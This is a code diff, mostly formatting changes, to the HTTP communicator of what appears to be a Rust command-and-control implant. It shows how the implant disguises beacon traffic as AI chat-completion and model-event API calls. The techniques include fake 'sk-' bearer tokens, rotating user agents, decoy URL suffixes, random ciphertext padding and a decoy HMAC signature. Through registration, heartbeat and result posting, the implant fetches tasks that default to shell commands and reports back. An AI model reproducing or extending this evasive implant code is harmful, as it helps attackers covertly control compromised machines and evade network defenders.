@@ -9,8 +9,8 @@
 //! 密文长度随机化：明文尾部追加随机数量空白（JSON 解析容忍），
 //! 心跳/结果节奏与 UA 由 profile 控制。
 
-use libra_common::models::ProfileTransform;
 use libra_common::models::AgentTask;
+use libra_common::models::ProfileTransform;
 use rand::Rng;
 use reqwest::Client;
 use serde_json::Value;
@@ -97,7 +97,12 @@ impl HttpCommunicator {
     /// 构建时注入的请求样式（UA 列表/附加头/路径后缀）。
     /// 在注册**前**生效（注册请求本身也带伪装），不改变入口路径；
     /// 注册后服务端 profile 会整体覆盖。
-    pub fn set_build_style(&mut self, user_agents: Vec<String>, extra_headers: Vec<String>, path_suffixes: Vec<String>) {
+    pub fn set_build_style(
+        &mut self,
+        user_agents: Vec<String>,
+        extra_headers: Vec<String>,
+        path_suffixes: Vec<String>,
+    ) {
         let p = self.profile.get_or_insert_with(Default::default);
         if !user_agents.is_empty() {
             p.user_agents = user_agents;
@@ -131,7 +136,8 @@ impl HttpCommunicator {
     }
 
     /// 本次请求的完整 URL：入口前缀 + 随机虚假业务后缀（profile 配置）。
-    fn entry_url(&self) -> String {        let suffix = self
+    fn entry_url(&self) -> String {
+        let suffix = self
             .profile
             .as_ref()
             .and_then(|p| {
@@ -146,7 +152,12 @@ impl HttpCommunicator {
         if suffix.is_empty() {
             format!("{}{}", self.server_url, self.entry_path)
         } else {
-            format!("{}{}/{}", self.server_url, self.entry_path.trim_end_matches('/'), suffix)
+            format!(
+                "{}{}/{}",
+                self.server_url,
+                self.entry_path.trim_end_matches('/'),
+                suffix
+            )
         }
     }
 
@@ -156,7 +167,9 @@ impl HttpCommunicator {
         if p.user_agents.is_empty() {
             return None;
         }
-        let idx = self.ua_index.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+        let idx = self
+            .ua_index
+            .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
         Some(p.user_agents[idx % p.user_agents.len()].clone())
     }
 
@@ -165,7 +178,12 @@ impl HttpCommunicator {
         let (pmin, pmax) = self
             .profile
             .as_ref()
-            .map(|p| (p.padding_min as usize, (p.padding_max as usize).max(p.padding_min as usize)))
+            .map(|p| {
+                (
+                    p.padding_min as usize,
+                    (p.padding_max as usize).max(p.padding_min as usize),
+                )
+            })
             .unwrap_or((0, 0));
         let pad_len = if pmax > 0 {
             rand::thread_rng().gen_range(pmin..=pmax)
@@ -184,13 +202,15 @@ impl HttpCommunicator {
         let (dk, tk, rk, sk, sidk) = self
             .profile
             .as_ref()
-            .map(|p| (
-                p.data_key.as_str(),
-                p.ts_key.as_str(),
-                p.rand_key.as_str(),
-                p.sign_key.as_str(),
-                p.token_key.as_str(),
-            ))
+            .map(|p| {
+                (
+                    p.data_key.as_str(),
+                    p.ts_key.as_str(),
+                    p.rand_key.as_str(),
+                    p.sign_key.as_str(),
+                    p.token_key.as_str(),
+                )
+            })
             .unwrap_or(("d", "ts", "r", "", "sid"));
 
         let ts = std::time::SystemTime::now()
@@ -207,14 +227,21 @@ impl HttpCommunicator {
         // 假签名：HMAC-SHA256(beacon_secret, ts|cipher) 的 hex —— 真实算法，
         // 与带鉴权的业务 API 结构一致；服务端宽松校验（失败不拒绝）。
         let sign = if !sk.is_empty() && !self.beacon_secret.is_empty() {
-            Some(hmac_sign(&self.beacon_secret, &format!("{ts}|{cipher_b64}")))
+            Some(hmac_sign(
+                &self.beacon_secret,
+                &format!("{ts}|{cipher_b64}"),
+            ))
         } else {
             None
         };
 
         // sid 字段仅在存在会话 token 时附带（注册请求无 token）
         let with_token = format!(r#","{}":"{}""#, sidk, token);
-        let token_part = if token.is_empty() { String::new() } else { with_token };
+        let token_part = if token.is_empty() {
+            String::new()
+        } else {
+            with_token
+        };
 
         match sign {
             Some(s) => format!(
@@ -234,10 +261,7 @@ impl HttpCommunicator {
         if let Some(ua) = self.pick_user_agent() {
             req = req.header(reqwest::header::USER_AGENT, ua);
         }
-        let resp = req
-            .send()
-            .await
-            .map_err(|e| e.to_string())?;
+        let resp = req.send().await.map_err(|e| e.to_string())?;
         let status = resp.status().as_u16();
         let text = resp.text().await.map_err(|e| e.to_string())?;
         Ok((status, text))
@@ -256,7 +280,13 @@ impl HttpCommunicator {
         let (ai_path, models, auth_prefix) = self
             .profile
             .as_ref()
-            .map(|p| (p.ai_path.as_str(), p.ai_models.as_slice(), p.auth_prefix.as_str()))
+            .map(|p| {
+                (
+                    p.ai_path.as_str(),
+                    p.ai_models.as_slice(),
+                    p.auth_prefix.as_str(),
+                )
+            })
             .unwrap_or(("/v1/chat/completions", &[][..], "sk-"));
 
         let cipher_b64 = self.pad_and_encrypt(inner_plain, key);
@@ -277,7 +307,11 @@ impl HttpCommunicator {
         let auth: String = {
             let mut b = [0u8; 24];
             rand::thread_rng().fill(&mut b);
-            format!("Bearer {}{}", auth_prefix, b.iter().map(|x| format!("{x:02x}")).collect::<String>())
+            format!(
+                "Bearer {}{}",
+                auth_prefix,
+                b.iter().map(|x| format!("{x:02x}")).collect::<String>()
+            )
         };
 
         let url = format!("{}{}", self.server_url, ai_path);
@@ -328,16 +362,16 @@ impl HttpCommunicator {
     /// 打开 SSE 任务事件流（伪装为模型事件流：GET /api/v1/models/events?channel=）。
     /// 服务端挂起连接并主动推送任务（AES-GCM 密文在 data: 行），
     /// 30s 注释 keepalive。调用方流式读取 body 逐行解析；401 = 会话丢失。
-    pub async fn open_events(&self, _key: &[u8; AES_KEY_SIZE]) -> Result<reqwest::Response, String> {
+    pub async fn open_events(
+        &self,
+        _key: &[u8; AES_KEY_SIZE],
+    ) -> Result<reqwest::Response, String> {
         let token = self.session_token.clone().unwrap_or_default();
         let url = format!(
             "{}{}?channel={}",
             self.server_url, "/api/v1/models/events", token
         );
-        let mut req = self
-            .client
-            .get(&url)
-            .header("Accept", "text/event-stream");
+        let mut req = self.client.get(&url).header("Accept", "text/event-stream");
         if let Some(ua) = self.pick_user_agent() {
             req = req.header(reqwest::header::USER_AGENT, ua);
         }
@@ -423,7 +457,8 @@ impl HttpCommunicator {
             (status, text)
         } else {
             let pre_key = libra_crypto::derive_pre_session_key(beacon_secret);
-            let envelope = serde_json::json!({ "op": "reg", "id": "", "data": reg_json }).to_string();
+            let envelope =
+                serde_json::json!({ "op": "reg", "id": "", "data": reg_json }).to_string();
             let body = self.build_body(&envelope, &pre_key);
             self.post_envelope(body).await?
         };
@@ -433,8 +468,8 @@ impl HttpCommunicator {
 
         // 注册响应：agent_id 等字段在明文 JSON 中（注册响应不含敏感数据），
         // session_key/profile 从对应字段读取。
-        let v: Value = serde_json::from_str(&resp_body)
-            .map_err(|e| format!("bad register response: {e}"))?;
+        let v: Value =
+            serde_json::from_str(&resp_body).map_err(|e| format!("bad register response: {e}"))?;
 
         let agent_id = v
             .get("agent_id")
@@ -500,17 +535,18 @@ impl HttpCommunicator {
             .duration_since(std::time::UNIX_EPOCH)
             .unwrap_or_default()
             .as_millis() as i64;
-        let inner = serde_json::json!({ "op": "hb", "id": token, "data": format!(r#"{{"ts":{}}}"#, ts) })
-            .to_string();
+        let inner =
+            serde_json::json!({ "op": "hb", "id": token, "data": format!(r#"{{"ts":{}}}"#, ts) })
+                .to_string();
 
         let plain = self.post_ai(&inner, key).await?;
-        let v: Value = serde_json::from_str(&plain)
-            .map_err(|e| format!("bad heartbeat payload: {e}"))?;
+        let v: Value =
+            serde_json::from_str(&plain).map_err(|e| format!("bad heartbeat payload: {e}"))?;
 
         let task = match v.get("pendingTask") {
             Some(task_val) if !task_val.is_null() => {
-                let task_json = serde_json::to_string(task_val)
-                    .map_err(|e| format!("task serialize: {e}"))?;
+                let task_json =
+                    serde_json::to_string(task_val).map_err(|e| format!("task serialize: {e}"))?;
                 Some(parse_task(&task_json))
             }
             _ => None,
@@ -528,7 +564,8 @@ impl HttpCommunicator {
         let key = session_key.ok_or("no session key")?;
         let token = self.session_token.clone().unwrap_or_default();
 
-        let inner = serde_json::json!({ "op": "res", "id": token, "data": result_json }).to_string();
+        let inner =
+            serde_json::json!({ "op": "res", "id": token, "data": result_json }).to_string();
         self.post_ai(&inner, key).await?;
         Ok(())
     }
@@ -575,18 +612,21 @@ fn parse_task(json: &str) -> AgentTask {
         Ok(task) => task,
         Err(_) => {
             // Fallback: parse from Value for partial compatibility
-            let v: serde_json::Value = serde_json::from_str(json).unwrap_or(serde_json::Value::Null);
+            let v: serde_json::Value =
+                serde_json::from_str(json).unwrap_or(serde_json::Value::Null);
             use libra_common::models::{CommandType, TaskStatus};
             AgentTask {
                 id: v["id"].as_str().unwrap_or_default().to_string(),
                 agent_id: v["agentId"].as_str().unwrap_or_default().to_string(),
                 created_by: v["createdBy"].as_str().unwrap_or_default().to_string(),
                 command: v["command"].as_str().unwrap_or_default().to_string(),
-                command_type: v["commandType"].as_str()
+                command_type: v["commandType"]
+                    .as_str()
                     .and_then(|s| serde_json::from_str::<CommandType>(&format!("\"{}\"", s)).ok())
                     .unwrap_or(CommandType::Shell),
                 arguments: Vec::new(),
-                status: v["status"].as_str()
+                status: v["status"]
+                    .as_str()
                     .and_then(|s| serde_json::from_str::<TaskStatus>(&format!("\"{}\"", s)).ok())
                     .unwrap_or(TaskStatus::Pending),
                 output: v["output"].as_str().map(|s| s.to_string()),
